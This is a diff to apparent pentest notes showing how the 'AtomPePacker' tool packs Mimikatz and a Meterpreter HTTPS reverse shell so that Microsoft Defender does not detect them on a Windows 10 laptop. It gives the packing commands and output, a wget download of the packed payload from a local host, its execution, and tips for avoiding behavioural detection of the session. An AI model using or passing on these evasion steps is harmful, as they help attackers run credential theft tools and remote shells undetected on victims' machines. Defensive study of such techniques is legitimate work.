@@ -22,10 +22,13 @@ Features :
 > fake imported functions to add more friendly look to the iat
 
 
-================================================================================================================================================
-Example 1 - The tool Mimikatz is not detected nor blocked by Defender AV after being packed by 'AtomPePacker'
-================================================================================================================================================
+==============================================================================================================================
+Example 1 - The tool Mimikatz is not detected nor blocked by the Microsoft Defender AV after being packed by 'AtomPePacker'
+==============================================================================================================================
 
+-------------------------------------------------------------------------------------------
+Step 1 - Use 'AtomPePacker' to generate a packed version of the tool Mimikatz.exe (x64)
+-------------------------------------------------------------------------------------------
 
 C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release>PePacker.exe "C:\temp\mimikatz_trunk_last\x64\mimikatz.exe" -e
 [i] Reading " C:\temp\mimikatz_trunk_last\x64\mimikatz.exe " ...
@@ -53,11 +56,12 @@ C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-m
                3 Dir(s)  77,364,178,944 bytes free
 
 
-C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release> copy C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release\PP64Stub.exe 
-                                                                                             C:\temp\PePacker-Mimi.exe
-        1 file(s) copied.
+=> Rename the file "PP64Stub.exe" by "PePacker-Mimi.exe"
 
-C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release> cd C:\temp
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download and execute on a Windows 10 laptop the packed version of Mimikatz.exe without being detected/blocked by Defender Antivirus 
+-------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\temp> powershell
 Windows PowerShell
@@ -137,3 +141,57 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
         cloudap :       KO
         
  <SNIP>
+
+
+==================================================================================================================================================
+Example 2 - Generate and run a packed version of a Meterpreter (x64) HTTPS reverse shell without being detected nor blocked by The MS Defender AV
+            on a Windows 10 laptop
+==================================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Use Msfvenom to generate a Meterpreter HTTPS reverse shell (x64)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Use 'AtomPePacker' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release>PePacker.exe "C:\temp\shellcode-stageless-pslistx64.exe" -e -h
+[i] Reading " C:\temp\shellcode-stageless-pslistx64.exe " ...
+[i] 64-PE Input Detected ... [ SUPPORTED ]
+[i] Generating No Console Exe Output ...
+[i] Reading The Loader "H_PP64Stub.exe" ... [ DONE ]
+[i] Packing ...  [ DONE ]
+[+] Compressed Ratio : 32%
+[+] Final Pe Size : 127038
+[+] Section .ATOM is Created Containing The Input Packed Pe
+
+=> Rename the file "H_PP64Stub.exe" by "PePacker-Shellcode.exe"
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute on a Windows 10 laptop the packed version of the Meterpreter HTTPS reverse shell (x64) without being 
+         detected nor blocked by the Microsoft Defender Antivirus 
+------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> wget -URI http://192.168.1.30:8080/PePacker-Shellcode.exe -OutFile PePacker-Shellcode.exe
+
+PS C:\temp> .\PePacker-Shellcode.exe
+
+PS C:\temp>
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
+------------------------------------------------------------------------------------------------------------------------------------
+
+Important note regarding AV detection  
+-------------------------------------
+=> While the Meterpreter was not detected by the Microsoft Defender Antivirus it was flagged by the HP Malware Protection and Threat containment
+   running on the Windows 10 laptop.
+=> If you want to limit the chance of being detected & blocked by antivirus like MS Defender it is recommanded to use the Meterpreter session only 
+   as a way to pivot (i.e. socks_proxy + proxychains).
+=> If you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will
+   detect these actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
+                
+                
